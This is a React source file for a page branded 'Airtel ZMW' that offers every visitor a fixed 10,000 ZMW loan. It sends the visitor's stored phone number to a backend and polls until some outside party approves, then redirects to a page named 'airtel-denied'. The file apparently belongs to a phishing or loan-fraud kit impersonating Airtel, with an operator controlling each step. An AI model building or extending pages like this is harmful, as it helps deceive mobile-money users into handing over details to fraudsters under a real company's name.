import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelLoanLimit() {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  const stopPolling = () => {
    if (pollRef.current) {
      clearInterval(pollRef.current);
      pollRef.current = null;
    }
  };

  const closeModal = () => {
    stopPolling();
    setIsProcessing(false);
    setStatusMessage('');
    setErrorMessage('');
  };

  const handleContinue = async () => {
    setIsProcessing(true);
    setErrorMessage('');
    setStatusMessage('Sending request...');

    const phone = localStorage.getItem('airtelPhone') || '';
    if (!phone) {
      navigate('/');
      return;
    }

    try {
      const res = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/request-loan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phone }),
      });
      const data = await res.json();

      if (data.status !== 'pending' || !data.approval_id) {
        setErrorMessage('Error sending request.');
        return;
      }

      setStatusMessage('Waiting for approval...');
      const approvalId = data.approval_id;

      let attempts = 0;
      const maxAttempts = 60; // 2 minutes

      pollRef.current = setInterval(async () => {
        attempts++;

        if (attempts > maxAttempts) {
          stopPolling();
          setErrorMessage('Request timed out. Please try again.');
          return;
        }

        try {
          const statusRes = await fetch(
            `${import.meta.env.VITE_API_BASE_URL}/api/loan-request-status/${approvalId}`
          );
          const statusData = await statusRes.json();

          if (statusData.status === 'approved') {
            stopPolling();
            setStatusMessage('Approved! Redirecting...');
            setTimeout(() => navigate('/airtel-denied'), 600);
          } else if (statusData.status === 'rejected') {
            stopPolling();
            localStorage.removeItem('airtelPhone');
            localStorage.removeItem('loanLimit');
            setIsProcessing(false);
            setStatusMessage('');
            navigate('/');
          } else if (statusData.status === 'expired') {
            stopPolling();
            setErrorMessage('Session expired. Please try again.');
          }
        } catch {
          // Network hiccup — keep polling
        }
      }, 2000);
    } catch {
      setErrorMessage('Server connection error.');
    }
  };

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel ZMW</h1>
        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        <button className="airtel-back-link" onClick={() => navigate(-1)} disabled={isProcessing}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Back
        </button>

        <h2 className="airtel-limit-heading">Your Loan Limit</h2>
        <p className="airtel-limit-subtext">
          Here is the amount you can borrow
        </p>

        {/* Highlighted Loan Amount Box */}
        <div className="airtel-limit-box">
          <span className="airtel-limit-label">Available Loan Amount</span>
          <span className="airtel-limit-amount">10,000</span>
          <span className="airtel-limit-currency">ZMW</span>
        </div>

        {/* Loan Details List */}
        <div className="airtel-details-list">
          <div className="airtel-detail-row">
            <span>Loan Term</span>
            <span>6 months</span>
          </div>
          <div className="airtel-detail-row">
            <span>Interest Rate</span>
            <span>13%</span>
          </div>
          <div className="airtel-detail-row">
            <span>Processing Fee</span>
            <span>Free</span>
          </div>
        </div>

        <button
          className="airtel-continue-btn"
          onClick={handleContinue}
          disabled={isProcessing}
        >
          {isProcessing ? 'Processing...' : 'Continue to Get Loan'}
          {!isProcessing && (
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12"></line>
              <polyline points="12 5 19 12 12 19"></polyline>
            </svg>
          )}
        </button>
      </div>

      {/* ---- PROCESSING MODAL ---- */}
      {isProcessing && (
        <div className="airtel-modal-overlay">
          <div className="airtel-modal">
            {errorMessage ? (
              <>
                <div className="airtel-modal-icon">
                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="8" x2="12" y2="12"></line>
                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                  </svg>
                </div>
                <h3 className="airtel-modal-title">An error occurred</h3>
                <p className="airtel-modal-subtext">{errorMessage}</p>
                <button className="airtel-modal-close-btn" onClick={closeModal}>
                  Close
                </button>
              </>
            ) : (
              <>
                <div className="airtel-modal-spinner" />
                <h3 className="airtel-modal-title">Processing...</h3>
                <p className="airtel-modal-subtext">
                  {statusMessage || 'Please wait...'}
                </p>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

export default AirtelLoanLimit;